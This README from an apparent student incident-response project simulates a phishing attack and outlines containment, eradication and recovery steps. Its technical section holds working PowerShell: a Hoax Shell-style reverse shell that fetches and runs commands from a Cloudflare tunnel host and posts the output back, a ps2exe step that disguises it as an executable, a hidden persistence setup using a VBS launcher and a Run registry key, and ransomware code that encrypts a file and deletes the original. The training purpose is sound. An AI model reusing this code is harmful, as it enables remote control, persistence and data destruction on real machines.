# DEPI-Incident Response Track Project

## Project Overview
This project simulates a cybersecurity incident where an employee receives a malicious email from someone impersonating a friend. 
The email contains an executable file disguised as an image (a meme). When the employee runs the executable `payload.exe`, it opens a reverse shell connection in the background. Additionally, the project includes a simulated ransomware that encrypts a file named PASS.txt.

The incident response plan for this project follows these phases:
- Preparation
- Containment
- Eradication
- Recovery
- Awareness

## Technical Details
### Reverse Shell Connection:
#### Cloudflare Tunnel
First of all to allow the payload to communicate externally,we’ve set up a Cloudflare tunnel with the command:

`cloudflared tunnel --url http://localhost:80`
This command creates a tunnel that forwards traffic from your local machine (running on http://localhost:80) to the Cloudflare network. 
As a result, the payload can connect back to our simulated attacker’s server through a Cloudflare-provided domain, such as `URI.trycloudflare.com:80`. 

This tunnel is essential because it bridges our local environment to the external network, enabling the reverse shell to function beyond our local machine.
#### Main Payload:
The core payload using Hoax Shell, embedded in `payload.exe`, establishes the reverse shell connection:
```
$s='TunnelURI.trycloudflare.com:80';
$i='bf5e666f-5498a73c-34007c82';
$p='http://';
$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};
while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});
if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;
$r=Out-String -InputObject $r;
$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
```

- `payload.exe` with the command: `ps2exe -InputFile payload.ps1 -OutputFile payload.exe -noConsole`.

Persistence is achieved with the following script, which creates a scheduled task to run the payload on startup:
```
Set-Content -Path "$env:APPDATA\sysupd.ps1" -Value '$s=''TunnelURI.trycloudflare.com:80'';
$i=''bf5e666f-5498a73c-34007c82'';
$p=''http://'';
$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{''Authorization''=$i};
while($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{''Authorization''=$i});
if($c -ne ''None''){$r=IEX $c -ErrorAction Stop -ErrorVariable e;
$r=Out-String -InputObject $r;
$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{''Authorization''=$i} -Body ($e+$r)} sleep 0.8}' -Force;
Set-Content -Path "$env:APPDATA\sysupd.vbs" -Value 'CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -File ""C:\Users\" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Roaming\sysupd.ps1""", 0, False' -Force;
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "wscript.exe "$env:APPDATA\sysupd.vbs"" -PropertyType String -Force
```

#### Simulated Ransomware:
The ransomware simulation searches for and encrypts `PASS.txt` on the desktop using AES encryption.

The original file is then deleted:
```
$k=[Text.Encoding]::UTF8.GetBytes("MySecretKey123!");
$a=[Security.Cryptography.Aes]::Create();
$a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash($k);
$f=Get-Item "$env:USERPROFILE\Desktop\PASS.txt";
$c=[IO.File]::ReadAllBytes($f.FullName);
[IO.File]::WriteAllBytes("$($f.FullName).encrypted",($a.CreateEncryptor().TransformFinalBlock($c,0,$c.Length)));
Remove-Item $f.FullName
```

## Incident Response Plan
This section summarizes the incident response plan for a phishing email attack involving an image-based payload. The plan outlines steps to detect, contain, eradicate, and recover from the incident, as well as maintain ongoing awareness.

### Preparation
The team prepares by setting up monitoring tools, drafting response plans, and training employees to recognize phishing attempts like the malicious email in this scenario.

### Containment
Upon detecting the reverse shell or ransomware, the team isolates the affected device, blocks the malicious domain `TunnelURI.trycloudflare.com`, and stops further damage.

### Eradication
The team removes the persistent script `sysupd.ps1`, `sysupd.vbs` and registry key `SystemUpdate`, then eliminates the ransomware and payload.

### Recovery
Systems are restored by decrypting PASS.txt (if a key is available), patching vulnerabilities, and verifying the device is clean before reconnecting it to the network.

### Awareness
Employees are educated about the incident, focusing on identifying suspicious emails and avoiding unverified executables.

Note: This is a summary. For the complete plan, including detailed procedures and tools, refer to the uploaded file 

[Incident Response Plan.docx].


## Conclusion

This project illustrates a realistic cybersecurity incident and demonstrates the importance of a structured incident response plan. 
By simulating an attack involving a reverse shell and ransomware, we tested our ability to respond effectively and identified key areas for improvement.












